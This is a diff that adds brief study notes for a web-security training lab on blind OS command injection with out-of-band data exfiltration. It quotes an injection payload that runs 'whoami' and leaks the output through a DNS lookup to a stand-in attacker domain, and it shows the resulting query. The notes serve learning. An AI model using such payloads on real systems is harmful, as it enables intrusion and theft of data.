@@ -1,0 +1,18 @@
+Lab #5 - Blind OS command injection with out-of-band data exfiltration
+
+Target Goal - Exploit blind OS command injection to execute whoami command and exfiltrate output via DNS query to Burp Collaborator
+
+Analysis - 
+
+External server of our control: https://www.myserver.com
+
+
+Reading Materials - 
+
+The out-of-band channel also provides an easy way to exfiltrate the output from injected commands:
+
+    '& nslookup `whoami`.kgji2ohoyw.web-attacker.com &'
+
+This will cause a DNS lookup to the attacker's domain containing the result of the whoami command:
+
+    'wwwuser.kgji2ohoyw.web-attacker.com'
